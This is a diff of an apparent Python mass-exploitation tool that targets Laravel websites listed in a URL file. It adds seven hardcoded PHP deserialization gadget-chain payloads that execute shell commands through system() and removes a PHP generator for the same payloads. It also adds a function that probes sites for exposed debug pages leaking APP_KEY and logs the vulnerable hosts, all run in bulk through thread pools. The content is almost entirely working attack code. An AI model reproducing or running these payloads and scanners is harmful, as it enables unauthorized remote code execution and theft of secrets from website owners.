@@ -5,10 +5,10 @@ import re
 import sys
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from io import BytesIO
-from multiprocessing.dummy import Pool
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from colorama import Fore
 import subprocess
+from multiprocessing.dummy import Pool  # Mengimpor Pool dari multiprocessing.dummy
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
@@ -289,6 +289,23 @@ def test_backpack(site):
             print(f"{fr}# {fw}" + site + f"{fw} | {fr}BOSOK")
 
 def exploit_laravel_unserialize(site, app_key):
+    payloads = [
+        # Payload 1
+        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:14:"uname -a";}',
+        # Payload 2
+        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"' + "\x00" + '*' + "\x00" + 'listeners";a:1:{s:14:"uname -a";a:1:{i:0;s:6:"system";}}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:14:"uname -a";}',
+        # Payload 3
+        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:39:"Illuminate\\Notifications\\ChannelManager":3:{s:6:"' + "\x00" + '*' + "\x00" + 'app";s:14:"uname -a";s:17:"' + "\x00" + '*' + "\x00" + 'defaultChannel";s:1:"x";s:17:"' + "\x00" + '*' + "\x00" + 'customCreators";a:1:{s:1:"x";s:6:"system";}}}',
+        # Payload 4
+        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:31:"Illuminate\\Validation\\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:14:"uname -a";}',
+        # Payload 5
+        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\\Loader\\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\\Generator\\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\\Generator\\MockConfiguration":1:{s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:14:"uname -a";}}}}',
+        # Payload 6
+        'O:29:"Illuminate\\Support\\MessageBag":2:{s:11:"' + "\x00" + '*' + "\x00" + 'messages";a:0:{}s:9:"' + "\x00" + '*' + "\x00" + 'format";O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\\Loader\\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\\Generator\\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\\Generator\\MockConfiguration":1:{s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:14:"uname -a";}}}}}',
+        # Payload 7
+        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\\Loader\\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\\Generator\\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\\Generator\\MockConfiguration":1:{s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:14:"uname -a";}}}}'
+    ]
+
     php_exploit_code = f"""
     #!/usr/bin/env php
     <?php
@@ -317,32 +334,6 @@ def exploit_laravel_unserialize(site, app_key):
 
             $encodedPayload = base64_encode($json);
             return $encodedPayload;
-        }}
-        public function GeneratePayload($command, $func = "system", $method = 1)
-        {{
-            $payload = null;
-            $p = "<?php $command exit; ?>";
-            switch ($method) {{
-                case 1:
-                    $payload = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:15:"Faker\\Generator":1:{{s:13:"' . "\x00" . '*' . "\x00" . 'formatters";a:1:{{s:8:"dispatch";s:' . strlen($func) . ':"' . $func . '";}}}}s:8:"' . "\x00" . '*' . "\x00" . 'event";s:' . strlen($command) . ':"' . $command . '";}}';
-                break;
-                case 2:
-                    $payload = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:28:"Illuminate\\Events\\Dispatcher":1:{{s:12:"' . "\x00" . '*' . "\x00" . 'listeners";a:1:{{s:' . strlen($command) . ':"' . $command . '";a:1:{{i:0;s:' . strlen($func) . ':"' . $func . '";}}}}}}s:8:"' . "\x00" . '*' . "\x00" . 'event";s:' . strlen($command) . ':"' . $command . '";}}';
-                break;
-                case 3:
-                    $payload = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:39:"Illuminate\\Notifications\\ChannelManager":3:{{s:6:"' . "\x00" . '*' . "\x00" . 'app";s:' . strlen($command) . ':"' . $command . '";s:17:"' . "\x00" . '*' . "\x00" . 'defaultChannel";s:1:"x";s:17:"' . "\x00" . '*' . "\x00" . 'customCreators";a:1:{{s:1:"x";s:' .strlen($func) . ':"' . $func . '";}}}}}}';
-                break;
-                case 4:
-                    $payload = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:31:"Illuminate\\Validation\\Validator":1:{{s:10:"extensions";a:1:{{s:0:"";s:' . strlen($func) . ':"' . $func . '";}}}}s:8:"' . "\x00" . '*' . "\x00" . 'event";s:' . strlen($command) . ':"' . $command . '";}}';
-                break;
-                case 5:
-                    $payload = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:25:"Illuminate\\Bus\\Dispatcher":1:{{s:16:"' . "\x00" . '*' . "\x00" . 'queueResolver";a:2:{{i:0;O:25:"Mockery\\Loader\\EvalLoader":0:{{}}i:1;s:4:"load";}}}}s:8:"' . "\x00" . '*' . "\x00" . 'event";O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:{{s:10:"connection";O:32:"Mockery\\Generator\\MockDefinition":2:{{s:9:"' . "\x00" . '*' . "\x00" . 'config";O:35:"Mockery\\Generator\\MockConfiguration":1:{{s:7:"' . "\x00" . '*' . "\x00" . 'name";s:7:"abcdefg";}}s:7:"' . "\x00" . '*' . "\x00" . 'code";s:'. strlen($p) . ':"' . $p . '";}}}}}}';
-                break;
-                case 6:
-                    $payload = 'O:29:"Illuminate\\Support\\MessageBag":2:{{s:11:"' . "\x00" . '*' . "\x00" . 'messages";a:0:{{}}s:9:"' . "\x00" . '*' . "\x00" . 'format";O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:25:"Illuminate\\Bus\\Dispatcher":1:{{s:16:"' . "\x00" . '*' . "\x00" . 'queueResolver";a:2:{{i:0;O:25:"Mockery\\Loader\\EvalLoader":0:{{}}i:1;s:4:"load";}}}}s:8:"' . "\x00" . '*' . "\x00" . 'event";O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:{{s:10:"connection";O:32:"Mockery\\Generator\\MockDefinition":2:{{s:9:"' . "\x00" . '*' . "\x00" . 'config";O:35:"Mockery\\Generator\\MockConfiguration":1:{{s:7:"' . "\x00" . '*' . "\x00" . 'name";s:7:"abcdefg";}}s:7:"' . "\x00" . '*' . "\x00" . 'code";s:' . strlen($p) . ':"' . $p . '";}}}}}}';
-                break;
-            }}
-            return base64_encode($payload);
         }}
     }}
     class Requester
@@ -510,11 +501,24 @@ def exploit_laravel_unserialize(site, app_key):
     except subprocess.TimeoutExpired:
         print(f"Timeout while trying to exploit {site}")
 
+def getdebug(url):
+    try:
+        with requests.Session() as session:
+            session.headers = {
+                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"}
+            wew = session.post(url, data={"0x[1]": "setsunawatanabeio"}, verify=False, timeout=10, allow_redirects=False)
+            if '<td>APP_KEY</td>' in wew.text:
+                print(f"[-] [LARAVEL DEBUG] [OK] {url}")
+                with open("result_debug_laravel.txt", "a") as result_file:
+                    result_file.write(url + "\n")
+    except Exception as e:
+        pass
+
 def main(file_path):
     domains = read_urls(file_path)
     results = []
 
-    with ThreadPoolExecutor(max_workers=10) as executor:
+    with ThreadPoolExecutor(max_workers=5) as executor:
         future_to_domain = {executor.submit(check_eval_stdin, domain): domain for domain in domains}
         for future in as_completed(future_to_domain):
             domain = future_to_domain[future]
@@ -534,7 +538,7 @@ def read_urls(file_path):
         urls = file.readlines()
     return [url.strip() for url in urls]
 
-kekw = Pool(50)  # Thread
+kekw = Pool(5)  # Thread
 kekw.map(checkenv, op)
 kekw.map(test_backpack, op)
 kekw.close()
